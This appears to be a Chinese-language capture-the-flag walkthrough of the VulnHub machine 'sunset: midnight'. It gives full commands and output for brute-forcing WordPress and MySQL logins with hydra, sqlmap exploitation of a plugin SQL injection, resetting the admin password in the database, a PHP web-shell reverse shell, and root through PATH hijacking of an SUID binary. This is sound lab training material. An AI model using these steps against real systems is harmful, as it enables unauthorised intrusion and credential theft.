# sunset: midnight

2024-5-27 https://www.vulnhub.com/entry/sunset-midnight,517/

difficulty: Intermediate

## IP

192.168.5.30

## Scan

根据靶场提示，将 192.168.5.30 sunset-midnight 添加到 /etc/hosts

Open Port -> 22,80,3306

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)
|   256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)
|_  256 3583682c338bb46c2421200d52edcd16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://sunset-midnight/
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, SupportsLoadDataLocal, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolOld, Speaks41ProtocolNew, Support41Auth, SupportsTransactions, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, DontAllowDatabaseTableColumn, ODBCClient, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: "#)CWj2W@zenu"H#r7\G
|_  Auth Plugin Name: mysql_native_password
```

直接访问 http://sunset-midnight/ 是个 wordpress，目录扫描看看有什么：

```
gobuster -t 64 dir -u http://sunset-midnight/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e
```

http://sunset-midnight/robots.txt 显示：

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

wpscan 枚举下用户：

```
wpscan --url http://sunset-midnight/ -e u

hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt sunset-midnight -f http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fsunset-midnight%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username admin is incorrect"
```

只有一个用户 admin，尝试爆破密码，没找到。

扫描一下插件：

```
wpscan --url http://sunset-midnight/ --plugins-detection mixed
```

https://www.exploit-db.com/exploits/40971 发现 wordpress 使用了插件 simply-poll-master Version: 1.5，这个插件存在 SQL 注入漏洞:

```
sqlmap -u "http://sunset-midnight/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" --dbs --threads=10 --random-agent --level=5 --risk=3 --batch

sqlmap identified the following injection point(s) with a total of 6065 HTTP(s) requests:
---
Parameter: pollid (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=spAjaxResults&pollid=2 AND (SELECT 6992 FROM (SELECT(SLEEP(5)))tRDz)
---

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] wordpress_db
```

抓 wp_users 表数据：

```
sqlmap -u "http://sunset-midnight/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" -D wordpress_db -T wp_users -C user_login,user_pass --dump --threads=10 --random-agent --level=5 --risk=3 --batch

+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ |
+------------+------------------------------------+
```

看看这个密文，能不能找到对应的明文。但是没有找到，进入不到管理后台，估计这条路是不行。

还开放了一个 mysql，尝试下 root 用户爆破吧：

```
hydra -t 20 -l root -P ~/tools/dict/rockyou.txt  mysql://192.168.5.30

[3306][mysql] host: 192.168.5.30   login: root   password: robert
```

发现 root 密码 robert。

登陆到 mysql 后，我们就能修改 wordpress 的密码为 123：

```
UPDATE `wp_users` SET `user_pass` = "$P$B1HeGknseK9zrkk2ZfBhJHo4PLoHOw0" WHERE user_login="admin";
```

这时，就能用 admin:123 登陆 wordpress 后台系统。修改密码这里是思路点，要想到拿不到明文密码，也可以修改成能够识别的明文密码。

admin 具有管理员权限，直接通过上传 Theme php web shell，kali 上进行监听，得到反弹连接：

```
nc -lvnp 8888

curl http://sunset-midnight/wp-content/uploads/2024/05/8888.php

www-data@midnight:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先升级 tty。

进行系统枚举，发现 2 个用户：

```
www-data@midnight:/$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
jose:x:1000:1000:jose,,,:/home/jose:/bin/bash
```

sudo、getcap、suid 都没发现特殊的程序。

wp 数据库配置文件中发现配置密码：

```
www-data@midnight:/var/www/html/wordpress$ cat /var/www/html/wordpress/wp-config.php

define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'jose' );
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );
define( 'DB_HOST', 'localhost' );
```

看看这个密码是不是 jose 的 ssh 用户密码，尝试 su jose 切换，切换成功。

在 jose 的家目录中，发现了 user flag：

```
jose@midnight:~$ cat user.txt
956a9564aa5632edca7b745c696f6575
```

尝试寻找提升到 root 权限的路径，sudo、getcap、crontab 都没找到，发现了一个非系统自带的 suid /usr/bin/status。

看看 /usr/bin/status 是什么内容：

```
jose@midnight:~$ /usr/bin/status
● ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Sun 2024-05-26 21:04:43 EDT; 1h 27min ago
     Docs: man:sshd(8)
           man:sshd_config(5)
  Process: 424 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
```

能够调用 service 查看 ssh 的状态。strings /usr/bin/status 发现 service 没有用绝对路径：

```
service ssh status
```

这里就可以用我们的程序进行替换：

```
cd /tmp
echo '/bin/bash -p' > /tmp/service && chmod +x /tmp/service
echo $PATH
PATH=/tmp:$PATH /usr/bin/status
```

就可以获得 root 权限:

```
root@midnight:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)
```

得到 flag：

```
root@midnight:/root# cat root.txt
          ___   ____
        /' --;^/ ,-_\     \ | /
       / / --o\ o-\ \\   --(_)--
      /-/-/|o|-|\-\\|\\   / | \
       '`  ` |-|   `` '
             |-|
             |-|O
             |-(\,__
          ...|-|\--,\_....
      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------

db2def9d4ddcb83902b884de39d426e6

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```
